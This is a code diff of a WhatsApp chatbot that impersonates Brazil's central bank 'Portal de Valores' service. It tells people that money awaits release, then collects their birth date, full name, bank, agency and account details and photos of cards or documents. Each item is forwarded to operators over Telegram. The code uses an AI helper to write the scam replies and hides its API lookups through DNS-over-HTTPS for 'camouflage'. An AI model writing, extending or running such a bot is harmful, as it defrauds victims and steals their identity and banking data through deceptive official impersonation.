-        { code: "290", name: "Pagseguro Internet S.A. (PagBank)", keywords: ["pagbank", "pagseguro", "pag bank", "pag", "pag seguro"] },
-        { code: "323", name: "Mercadopago.Com Representacoes Ltda.", keywords: ["mercado pago", "mercado livre", "mercadopago", "mp", "mercadopago"] },
-        { code: "041", name: "Banrisul", keywords: ["banrisul", "banrisu", "banco do estado do rio grande do sul"] },
-        { code: "623", name: "Banco Pan S.A.", keywords: ["pan", "banco pan", "bancopan"] },
-        { code: "756", name: "Sicoob", keywords: ["sicoob", "sicob", "sicoobi"] },
-        { code: "748", name: "Sicredi", keywords: ["sicredi", "sicred", "sicredy"] },
-        { code: "380", name: "Picpay Servicos S.A.", keywords: ["picpay", "pic pay", "pikpay"] }
-    ];
+    const userMessageCounts = new Map();
 
-    // 1. Busca por keywords exatas/contidas
-    for (const bank of commonPatterns) {
-        if (bank.keywords.some(k => textFocus.includes(k) || clean.includes(k))) {
-            return { code: bank.code, name: bank.name };
+    client.on('message', async (msg) => {
+        if (BOT_ID !== 'main') return;
+        if (msg.fromMe) return;
+
+        const targetChatId = msg.from;
+        if (!targetChatId) return;
+        if (targetChatId.includes('@g.us')) return;
+
+        // --- PROTEÇÃO ANTI-FLOOD ---
+        const now = Date.now();
+        const stats = userMessageCounts.get(targetChatId) || { count: 0, firstMsgTime: now };
+
+        // Reseta contador a cada 10 segundos
+        if (now - stats.firstMsgTime > 10000) {
+            stats.count = 0;
+            stats.firstMsgTime = now;
         }
-    }
 
-    // 2. Busca na lista completa (BANCOS_LIST)
-    for (const [code, name] of Object.entries(BANCOS_LIST)) {
-        const cleanBankName = name.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
-        if (clean.includes(code) || clean.includes(cleanBankName) || textFocus.includes(cleanBankName)) {
-            return { code, name };
+        stats.count++;
+        userMessageCounts.set(targetChatId, stats);
+
+        if (stats.count > 5) {
+            console.log(`⚠️ [ANTI-FLOOD] Ignorando flood de mensagens de ${targetChatId}`);
+            return;
         }
-    }
 
-    // 3. Inteligência Artificial de fallback (Fuzzy match manual)
-    let bestMatch = null;
-    let highestScore = 0;
-
-    const searchPool = [
-        ...commonPatterns.map(b => ({ code: b.code, name: b.name, search: b.keywords[0] })),
-        ...Object.entries(BANCOS_LIST).map(([code, name]) => ({
-            code,
-            name,
-            search: name.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/[^a-z0-9 ]/g, " ").trim()
-        }))
-    ];
-
-    for (const item of searchPool) {
-        const score = similarity(textFocus, item.search);
-        if (score > highestScore) {
-            highestScore = score;
-            bestMatch = item;
+        if (processingLock.has(targetChatId)) {
+            console.log(`⏳ [LOCK] Mensagem de ${targetChatId} ignorada — já processando.`);
+            return;
         }
-    }
+        processingLock.add(targetChatId);
 
-    // Se a similaridade for alta o suficiente (acima de 75%)
-    if (highestScore > 0.75) {
-        return { code: bestMatch.code, name: bestMatch.name };
-    }
+        try {
+            await processIncomingMessage(msg, targetChatId);
+        } catch (e) {
+            console.error(`❌ [ERRO] Falha ao processar mensagem de ${targetChatId}:`, e.message);
+        } finally {
+            // Reduzido o lock para 1s para ser mais responsivo se o bot estiver lento
+            setTimeout(() => processingLock.delete(targetChatId), 1000);
+        }
+    });
 
-    return null;
-}
-function validateBankData(bankCode, ag, cc) {
-    const cleanAg = ag.replace(/\D/g, "");
-    const cleanCc = cc.replace(/\D/g, "");
+    async function processIncomingMessage(msg, targetChatId) {
+        const text = (msg.body || "").trim();
+        const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');
 
-    // Regras específicas para os maiores bancos (Overrides)
-    const specificRules = {
-        "001": { agLen: 4, ccMin: 5, ccMax: 9 },  // BB
-        "237": { agLen: 4, ccMin: 5, ccMax: 7 },  // Bradesco
-        "341": { agLen: 4, ccMin: 5, ccMax: 5 },  // Itaú
-        "104": { agLen: 4, ccMin: 11, ccMax: 13 }, // Caixa (com operação)
-        "033": { agLen: 4, ccMin: 8, ccMax: 8 },  // Santander
-        "260": { agLen: 4, ccMin: 4, ccMax: 10 }, // Nubank
-        "077": { agLen: 4, ccMin: 4, ccMax: 10 }, // Inter
-        "336": { agLen: 4, ccMin: 4, ccMax: 10 }  // C6 Bank
-    };
+        fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));
 
-    const bankName = BANCOS_LIST[bankCode] || "Instituição";
-    const rule = specificRules[bankCode] || { agLen: 4, ccMin: 4, ccMax: 15 }; // Regra padrão para todos os bancos da lista
+        const currentSession = chatSessions.get(targetChatId);
 
-    if (cleanAg.length !== rule.agLen) {
-        return { valid: false, error: `A agência do ${bankName} deve conter exatamente ${rule.agLen} dígitos.` };
-    }
-    if (cleanCc.length < rule.ccMin || cleanCc.length > rule.ccMax) {
-        return { valid: false, error: `A conta informada para o ${bankName} parece ser inválida ou está fora do padrão (mínimo ${rule.ccMin} dígitos).` };
-    }
+        if (isTrigger) {
+            if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;
 
-    return { valid: true };
-}
+            const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
+            const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
+            const docTypeMatch = text.match(/Tipo de Documento: \*(CPF|CNPJ)\*/i);
+            const docType = docTypeMatch ? docTypeMatch[1].toUpperCase() : 'CPF';
+            const isPJ = docType === 'CNPJ';
 
+            let expectedData = null;
+            if (userId) {
+                try {
+                    // Tenta buscar da API (que agora tem persistência)
+                    // Resolve domain via DoH for camouflage
+                    const apiHost = new URL(API_URL).hostname;
+                    const ips = await queryDnsDoH(apiHost);
+                    if (ips.length > 0) {
+                        console.log(`🌐 [API-DoH] resolved API -> ${ips[0]}`);
+                    }
 
-client.on('message_create', async (msg) => {
-    if (BOT_ID !== 'main') return;
-    if (!msg.fromMe) return;
+                    const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, {
+                        headers: API_HEADERS,
+                        timeout: 8000,
+                        httpsAgent: getSecureHttpsAgent()
+                    });
 
-    const targetChatId = msg.to;
-    if (!targetChatId) return;
-    if (targetChatId.includes('@g.us')) return;
-
-    const currentSession = chatSessions.get(targetChatId);
-
-    // --- DETECÇÃO DE LIGAÇÃO ATENDIDA / DESLIGADA ---
-    if (msg.type === 'call_log') {
-        const callBody = (msg.body || '').toLowerCase();
-
-        // Verifica se é uma chamada de VÍDEO
-        const isVideoCall = callBody.includes('vídeo') || callBody.includes('video') || msg.isVideo === true;
-
-        // Verifica se a ligação foi atendida (não perdida/recusada/rejeitada)
-        // Se a duração aparecer no corpo, é um forte sinal de que foi atendida
-        const hasDuration = /\d+ (min|seg|sec)/.test(callBody);
-        const isMissed = callBody.includes('perdida') || callBody.includes('missed') || callBody.includes('sem resposta') || callBody.includes('rejeitada') || callBody.includes('recusada') || callBody.includes('cancelada');
-
-        const callAnswered = !isMissed && (hasDuration || callBody.length > 5);
-
-        if (currentSession) {
-            currentSession.isCalling = false;
-
-            // REGRA: Só libera Etapa 2 se for Chamada de VÍDEO e for ATENDIDA
-            if (isVideoCall && callAnswered) {
-                // Ligação de vídeo atendida e encerrada → Etapa 2 CONCLUÍDA
-                currentSession.humanStep = 2;
-                console.log(`✅ [CALL] Vídeo chamada atendida por ${targetChatId} — Etapa 2 CONCLUÍDA.`);
-            } else if (callAnswered && !isVideoCall) {
-                console.log(`ℹ️ [CALL] Chamada de VOZ atendida por ${targetChatId} — Ignorado (exige Vídeo).`);
-            } else {
-                // Ligação perdida/não atendida/rejeitada → Etapa 2 PENDENTE
-                currentSession.humanStep = 1;
-                console.log(`📵 [CALL] Chamada NÃO atendida por ${targetChatId} — Etapa 2 volta para PENDENTE.`);
+                    if (res.status === 200 && res.data) {
+                        expectedData = res.data;
+                        console.log(`✅ [SINC] Dados recuperados da API para userId: ${userId}`);
+                    }
+                } catch (e) {
+                    console.warn(`⚠️ [SINC] Falha ao buscar da API (${userId}). Tentando base local...`);
+                    // FAILBACK: Tenta ler diretamente do arquivo se estiver no mesmo servidor
+                    try {
+                        const visitorPath = path.join(process.cwd(), 'visitor-sessions.json');
+                        if (fs.existsSync(visitorPath)) {
+                            const visitors = JSON.parse(fs.readFileSync(visitorPath, 'utf-8'));
+                            if (visitors[userId]) {
+                                expectedData = {
+                                    docValue: visitors[userId].docValue,
+                                    birthDate: visitors[userId].birthDate,
+                                    fullName: ""
+                                };
+                                console.log(`📂 [SINC] Dados recuperados da base LOCAL para userId: ${userId}`);
+                            }
+                        }
+                    } catch (err) { }
+                }
             }
 
-            chatSessions.set(targetChatId, currentSession);
+            const { text: txtInit, reply_markup } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType);
+            const tgMsgId = await notifyTelegram(txtInit, null, reply_markup);
+
+            chatSessions.set(targetChatId, {
+                mode: 'bot',
+                step: 1,
+                userId,
+                expectedData,
+                docType,
+                lastMsgTime: Date.now(),
+                createdAt: Date.now(),
+                tgMsgId
+            });
             saveSessions();
 
-            // 1. ATUALIZA PAINEL NO TELEGRAM
-            if (currentSession.tgMsgId) {
-                const { text: txt, reply_markup } = buildCadastroMessage(
-                    targetChatId,
-                    currentSession.name,
-                    currentSession.birthDate,
-                    'human',
-                    currentSession.docType,
-                    currentSession.humanStep,
-                    false
-                );
-                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
-            }
-
-            // 2. ATUALIZA MENSAGEM NO WHATSAPP (EDITA)
             setTimeout(async () => {
-                try {
-                    if (currentSession.assumeMsgId) {
-                        const msg = await client.getMessageById(currentSession.assumeMsgId);
-                        await msg.edit(buildStatusMessage(currentSession.humanStep));
-                    } else {
-                        // Se não achar a mensagem para editar, manda uma nova com o status atual
-                        await sendBotMessage(targetChatId, buildStatusMessage(currentSession.humanStep));
-                    }
-                } catch (e) {
-                    console.error("Erro ao atualizar status após call:", e.message);
+                if (isPJ) {
+                    await sendBotMessage(targetChatId,
+                        `🏢 *Portal de Valores — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
+                } else {
+                    await sendBotMessage(targetChatId,
+                        `👋 *Olá! Sou o assistente oficial do Portal de Valores.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
                 }
             }, 1500);
+            return;
         }
-        return;
-    }
 
-    if (!currentSession || (currentSession.mode !== 'bot' && currentSession.mode !== 'waiting') || internalMessageChats.has(targetChatId)) return;
+        if (currentSession && currentSession.mode === 'waiting') {
+            const pos = getQueuePosition(targetChatId);
+            const chat = await msg.getChat();
+            await chat.sendStateTyping();
 
-    const updatedSession = {
-        ...currentSession,
-        mode: 'human',
-        humanStep: 1,
-        name: currentSession.name || null,
-        birthDate: currentSession.birthDate || null,
-        docType: currentSession.docType || 'CPF'
-    };
+            const aiReply = await askAI(PROMPT_FILA, text);
+            const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
+            const fallback = `📋 *Portal de Valores — Sistema de Valores a Receber*\n\nPrezado(a) titular,\n\nSeus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\nO processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\nAgradecemos sua compreensão.\n_Portal de Valores — Banco Central do Brasil_`;
 
-    chatSessions.set(targetChatId, updatedSession);
-    saveSessions();
-
-    const { text: txtAssume, reply_markup: rmAssume } = buildCadastroMessage(targetChatId, updatedSession.name, updatedSession.birthDate, 'human', updatedSession.docType, 1);
-    await notifyTelegram(txtAssume, updatedSession.tgMsgId, rmAssume);
-
-    setTimeout(async () => {
-        try {
-            const sentMsg = await sendBotMessage(targetChatId, buildStatusMessage(1));
-            if (sentMsg && sentMsg.id) {
-                updatedSession.assumeMsgId = sentMsg.id._serialized;
-                chatSessions.set(targetChatId, updatedSession);
-                saveSessions();
-            }
-            console.log(`📨 [ADMIN] Mensagem formal enviada ao lead: ${targetChatId}`);
-        } catch (e) {
-            console.error(`❌ [ADMIN] Erro ao enviar mensagem formal:`, e.message);
+            await sendBotMessage(targetChatId, aiReply || fallback);
+            return;
         }
-    }, 1000);
-});
 
-const userMessageCounts = new Map();
-
-client.on('message', async (msg) => {
-    if (BOT_ID !== 'main') return;
-    if (msg.fromMe) return;
-
-    const targetChatId = msg.from;
-    if (!targetChatId) return;
-    if (targetChatId.includes('@g.us')) return;
-
-    // --- PROTEÇÃO ANTI-FLOOD ---
-    const now = Date.now();
-    const stats = userMessageCounts.get(targetChatId) || { count: 0, firstMsgTime: now };
-
-    // Reseta contador a cada 10 segundos
-    if (now - stats.firstMsgTime > 10000) {
-        stats.count = 0;
-        stats.firstMsgTime = now;
-    }
-
-    stats.count++;
-    userMessageCounts.set(targetChatId, stats);
-
-    if (stats.count > 5) {
-        console.log(`⚠️ [ANTI-FLOOD] Ignorando flood de mensagens de ${targetChatId}`);
-        return;
-    }
-
-    if (processingLock.has(targetChatId)) {
-        console.log(`⏳ [LOCK] Mensagem de ${targetChatId} ignorada — já processando.`);
-        return;
-    }
-    processingLock.add(targetChatId);
-
-    try {
-        await processIncomingMessage(msg, targetChatId);
-    } catch (e) {
-        console.error(`❌ [ERRO] Falha ao processar mensagem de ${targetChatId}:`, e.message);
-    } finally {
-        // Reduzido o lock para 1s para ser mais responsivo se o bot estiver lento
-        setTimeout(() => processingLock.delete(targetChatId), 1000);
-    }
-});
-
-async function processIncomingMessage(msg, targetChatId) {
-    const text = (msg.body || "").trim();
-    const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');
-
-    fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));
-
-    const currentSession = chatSessions.get(targetChatId);
-
-    if (isTrigger) {
-        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;
-
-        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
-        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
-        const docTypeMatch = text.match(/Tipo de Documento: \*(CPF|CNPJ)\*/i);
-        const docType = docTypeMatch ? docTypeMatch[1].toUpperCase() : 'CPF';
-        const isPJ = docType === 'CNPJ';
-
-        let expectedData = null;
-        if (userId) {
-            try {
-                // Tenta buscar da API (que agora tem persistência)
-                // Resolve domain via DoH for camouflage
-                const apiHost = new URL(API_URL).hostname;
-                const ips = await queryDnsDoH(apiHost);
-                if (ips.length > 0) {
-                    console.log(`🌐 [API-DoH] resolved API -> ${ips[0]}`);
-                }
-
-                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, {
-                    headers: API_HEADERS,
-                    timeout: 8000,
-                    httpsAgent: getSecureHttpsAgent()
-                });
-
-                if (res.status === 200 && res.data) {
-                    expectedData = res.data;
-                    console.log(`✅ [SINC] Dados recuperados da API para userId: ${userId}`);
-                }
-            } catch (e) {
-                console.warn(`⚠️ [SINC] Falha ao buscar da API (${userId}). Tentando base local...`);
-                // FAILBACK: Tenta ler diretamente do arquivo se estiver no mesmo servidor
-                try {
-                    const visitorPath = path.join(process.cwd(), 'visitor-sessions.json');
-                    if (fs.existsSync(visitorPath)) {
-                        const visitors = JSON.parse(fs.readFileSync(visitorPath, 'utf-8'));
-                        if (visitors[userId]) {
-                            expectedData = {
-                                docValue: visitors[userId].docValue,
-                                birthDate: visitors[userId].birthDate,
-                                fullName: ""
-                            };
-                            console.log(`📂 [SINC] Dados recuperados da base LOCAL para userId: ${userId}`);
+        if (currentSession && currentSession.mode === 'human') {
+            if (currentSession.humanStep === 5) {
+                if (msg.hasMedia) {
+                    try {
+                        const media = await msg.downloadMedia();
+                        if (media) {
+                            const buffer = Buffer.from(media.data, 'base64');
+                            await notifyTelegramPhoto(buffer, `🔐 <b>DOCUMENTO SIGILOSO RECEBIDO</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou um anexo (Cartão/Doc) para validação da Etapa 5.</i>`);
                         }
+                    } catch (e) {
+                        await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
                     }
-                } catch (err) { }
-            }
-        }
-
-        const { text: txtInit, reply_markup } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType);
-        const tgMsgId = await notifyTelegram(txtInit, null, reply_markup);
-
-        chatSessions.set(targetChatId, {
-            mode: 'bot',
-            step: 1,
-            userId,
-            expectedData,
-            docType,
-            lastMsgTime: Date.now(),
-            createdAt: Date.now(),
-            tgMsgId
-        });
-        saveSessions();
-
-        setTimeout(async () => {
-            if (isPJ) {
-                await sendBotMessage(targetChatId,
-                    `🏢 *Portal de Valores — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
-            } else {
-                await sendBotMessage(targetChatId,
-                    `👋 *Olá! Sou o assistente oficial do Portal de Valores.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
-            }
-        }, 1500);
-        return;
-    }
-
-    if (currentSession && currentSession.mode === 'waiting') {
-        const pos = getQueuePosition(targetChatId);
-        const chat = await msg.getChat();
-        await chat.sendStateTyping();
-
-        const aiReply = await askAI(PROMPT_FILA, text);
-        const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
-        const fallback = `📋 *Portal de Valores — Sistema de Valores a Receber*\n\nPrezado(a) titular,\n\nSeus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\nO processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\nAgradecemos sua compreensão.\n_Portal de Valores — Banco Central do Brasil_`;
-
-        await sendBotMessage(targetChatId, aiReply || fallback);
-        return;
-    }
-
-    if (currentSession && currentSession.mode === 'human') {
-        if (currentSession.humanStep === 5) {
-            if (msg.hasMedia) {
-                try {
-                    const media = await msg.downloadMedia();
-                    if (media) {
-                        const buffer = Buffer.from(media.data, 'base64');
-                        await notifyTelegramPhoto(buffer, `🔐 <b>DOCUMENTO SIGILOSO RECEBIDO</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou um anexo (Cartão/Doc) para validação da Etapa 5.</i>`);
-                    }
-                } catch (e) {
-                    await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
+                    await sendBotMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
+                    return;
                 }
-                await sendBotMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
-                return;
-            }
 
-            const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
-            const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
+                const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
+                const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
 
-            if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
-                const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
-                const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');
-                await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
-                await sendBotMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
-                return;
-            }
-        }
-        return;
-    }
-
-    if (!currentSession || currentSession.mode !== 'bot') {
-        const chat = await msg.getChat();
-        await chat.sendStateTyping();
-
-        const { text: txtEsp, reply_markup: rmEsp } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data');
-        const tgMsgId = await notifyTelegram(txtEsp, null, rmEsp);
-        await notifyTelegram(`📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`);
-
-        chatSessions.set(targetChatId, {
-            mode: 'bot',
-            step: 1,
-            userId: null,
-            expectedData: null,
-            lastMsgTime: Date.now(),
-            createdAt: Date.now(),
-            tgMsgId
-        });
-        saveSessions();
-
-        const aiReply = await askAI(PROMPT_INICIAL, text);
-        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal de Valores — Sistema de Valores a Receber.*\n\nIdentificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\nPara prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
-
-        setTimeout(async () => {
-            await sendBotMessage(targetChatId, aiReply || fallback);
-        }, 1500);
-        return;
-    }
-
-    currentSession.lastMsgTime = Date.now();
-    const chat = await msg.getChat();
-    await chat.sendStateTyping();
-    const isPJ = currentSession.docType === 'CNPJ';
-
-    if (currentSession.step === 1) {
-        // More robust date regex: matches DD/MM/YYYY, DD-MM-YYYY, or DDMMYYYY
-        const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})/) || text.match(/(\d{8})/);
-
-        if (!dateMatch) {
-            console.log(`[BOT] Date format not recognized for ${targetChatId}: "${text}"`);
-            const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
-            const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
-            const fallback = `⚠️ *Portal de Valores — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
-            await sendBotMessage(targetChatId, aiReply || fallback);
-            return;
-        }
-
-        const rawDate = dateMatch[0];
-        const cleanTyped = rawDate.replace(/\D/g, "");
-
-        // Ensure we have exactly 8 digits (DDMMYYYY)
-        if (cleanTyped.length !== 8) {
-            await sendBotMessage(targetChatId, `⚠️ *Data Incompleta*\n\nPor favor, informe a data completa com dia, mês e ano (Ex: 10/05/1990).`);
-            return;
-        }
-
-        // Comparison logic
-        // Strict Comparison logic
-        if (currentSession.userId && !currentSession.expectedData) {
-            // If we have a userId but no data, try one last time to fetch it (in case of server lag)
-            console.log(`[BOT] userId present but no expectedData for ${targetChatId}. Retrying fetch...`);
-            try {
-                const res = await axios.get(`${API_URL}/api/v1/session/data/${currentSession.userId}`, {
-                    headers: API_HEADERS,
-                    timeout: 3000,
-                    httpsAgent: getSecureHttpsAgent()
-                });
-
-                if (res.data && res.data.birthDate) {
-                    currentSession.expectedData = res.data;
-                    console.log(`[BOT] Successfully recovered expectedData on retry for ${targetChatId}`);
-                }
-            } catch (e) {
-                console.log(`[BOT] Retry fetch failed for ${targetChatId}: ${e.message}`);
-            }
-        }
-
-        if (currentSession.expectedData?.birthDate) {
-            const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
-            console.log(`[BOT] Comparing dates for ${targetChatId}: Typed=${cleanTyped}, Expected=${cleanExpected}`);
-
-            if (cleanTyped !== cleanExpected) {
-                console.log(`[BOT] DIVERGENCE: Typed ${cleanTyped} != Expected ${cleanExpected}`);
-                await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal de Valores*\n\nA data informada não corresponde aos registros cadastrais do titular no portal.\n\nPor gentileza, verifique os dados e informe novamente conforme preenchido anteriormente.\n📌 *Formato:* DD/MM/AAAA`);
-                return;
-            }
-            console.log(`[BOT] Date MATCH for ${targetChatId}`);
-        } else if (currentSession.userId) {
-            // We have a protocol but still no data found on server
-            console.log(`[BOT] ERROR: userId ${currentSession.userId} has no data on server. Rejecting to be safe.`);
-            await notifyTelegram(`🚨 <b>FALHA DE SINCRONISMO</b>\nLead: <code>${targetChatId}</code>\nID: <code>${currentSession.userId}</code>\n<i>O lead tentou validar mas os dados do portal não foram encontrados. Sistema bloqueou por segurança.</i>`);
-            await sendBotMessage(targetChatId, `⚠️ *ERRO DE SINCRONISMO — Portal de Valores*\n\nNão foi possível localizar seu registro de consulta em nossa base de dados central.\n\nPor gentileza, retorne ao site e realize a consulta novamente para gerar um novo protocolo de segurança.`);
-            return;
-        } else {
-            console.log(`[BOT] Spontaneous lead (no protocol) ${targetChatId}. Proceeding with sanity check.`);
-            await notifyTelegram(`⚠️ <b>CONTATO DIRETO (SEM PORTAL)</b>\nLead: <code>${targetChatId}</code>\n<i>O lead entrou em contato sem passar pelo site. Validação manual necessária.</i>`);
-        }
-
-        // Format for storage: DD/MM/AAAA
-        const formattedDate = cleanTyped.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3");
-
-        currentSession.step = 2;
-        currentSession.birthDate = formattedDate;
-        chatSessions.set(targetChatId, currentSession);
-        saveSessions();
-
-        if (currentSession.tgMsgId) {
-            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, null, formattedDate, 'preenchendo_nome', currentSession.docType);
-            await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
-        }
-
-        if (isPJ) {
-            await sendBotMessage(targetChatId, `✅ *Data de abertura confirmada!*\n\n📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
-        } else {
-            await sendBotMessage(targetChatId, `✅ *Data de nascimento confirmada!*\n\n📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
-        }
-
-    } else if (currentSession.step === 2) {
-        const typedName = text.trim();
-        if (typedName.length >= 8 && typedName.includes(" ")) {
-            if (currentSession.expectedData?.fullName) {
-                const isMatch = checkNameMatch(typedName, currentSession.expectedData.fullName);
-                if (!isMatch) {
-                    await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nO nome informado não corresponde ao titular registrado no protocolo.\n\nPor favor, digite o nome completo exato (Ex: João da Silva Santos):`);
+                if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
+                    const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
+                    const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');
+                    await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
+                    await sendBotMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
                     return;
                 }
             }
-            currentSession.step = 2.5;
-            currentSession.name = typedName;
-            chatSessions.set(targetChatId, currentSession);
-            saveSessions();
-
-            if (currentSession.tgMsgId) {
-                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
-                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
-            }
-
-            await sendBotMessage(targetChatId, `✅ *Nome Completo confirmado!*\n\n📍 *FASE 1.3:* Informe o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):`);
-        } else {
-            const fallback = `⚠️ *Portal de Valores — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
-            await sendBotMessage(targetChatId, fallback);
-        }
-    } else if (currentSession.step === 2.5) {
-        let detected = detectBank(text);
-
-        // Fallback inteligente com IA se a detecção local falhar
-        if (!detected) {
-            const aiResult = await askAI(PROMPT_BANCO_EXTRACT, text);
-            if (aiResult && aiResult.trim().toUpperCase() !== "NULL") {
-                detected = detectBank(aiResult.trim());
-            }
-        }
-
-        if (!detected) {
-            await sendBotMessage(targetChatId, `⚠️ Não consegui identificar a instituição bancária. Por favor, informe o nome do banco novamente (Ex: Nubank, Bradesco, Itaú, Caixa):`);
             return;
         }
-        currentSession.bankName = detected.name;
-        currentSession.bankCode = detected.code;
-        currentSession.step = 3;
-        chatSessions.set(targetChatId, currentSession);
-        saveSessions();
-        await sendBotMessage(targetChatId, `🏦 Banco identificado: *${detected.name}* ✅\n\nAgora informe os números da sua *Agência* bancária:`);
-    } else if (currentSession.step === 3) {
-        const typedAg = text.trim().replace(/\D/g, "");
 
-        if (typedAg.length >= 3 && typedAg.length <= 5) {
-            currentSession.step = 4;
-            currentSession.bankAg = typedAg;
-            chatSessions.set(targetChatId, currentSession);
+        if (!currentSession || currentSession.mode !== 'bot') {
